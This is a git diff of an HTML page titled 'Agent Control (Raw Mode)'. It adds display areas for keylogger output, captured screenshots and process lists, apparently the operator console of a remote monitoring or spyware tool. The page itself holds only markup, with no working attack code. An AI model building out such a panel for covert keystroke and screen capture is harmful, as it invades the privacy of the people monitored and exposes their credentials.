@@ -1,7 +1,28 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Agent Control (Raw Mode)</title>
+    <style>
+        .hidden { display: none; }
+        #keylog-panel { width: 100%; height: 200px; border: 1px solid black; }
+        img { max-width: 100%; border: 2px solid red; }
+    </style>
+</head>
 <body>
-    <h1>Open Console (F12) to test logic</h1>
+    <h1>Control Panel (F12 for Lists)</h1>
+    
+    <h3>Keylogger Output:</h3>
+    <textarea id="keylog-panel" placeholder="Keylog sẽ hiện ở đây..."></textarea>
+
+    <h3>Screenshot Area:</h3>
+    <div id="image-modal" class="hidden"> <p>Ảnh chụp màn hình mới nhất:</p>
+        <img id="modal-img" src="" alt="Screenshot will appear here"/>
+    </div>
+
+    <div id="system-log" style="border-top: 1px dashed #ccc; margin-top: 20px;">
+        <p><i>Check Console (F12) for Process/App Lists</i></p>
+    </div>
+
     <script type="module" src="./js/main.js"></script>
 </body>
 </html>
